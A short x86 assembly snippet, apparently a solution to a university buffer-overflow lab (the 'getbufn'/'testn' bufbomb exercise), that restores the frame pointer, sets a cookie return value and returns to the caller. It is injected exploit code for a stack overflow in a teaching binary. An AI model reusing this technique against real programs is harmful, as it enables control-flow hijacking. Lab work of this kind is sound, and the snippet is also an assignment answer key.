lea 0x28 (%esp)   , %ebp # restore ebp register contents
movl  $0x1b39bd38 , %eax # returns the cookie value
pushl $0x08048dba        # return address pointing instruction after getbufn() call in testn()
ret
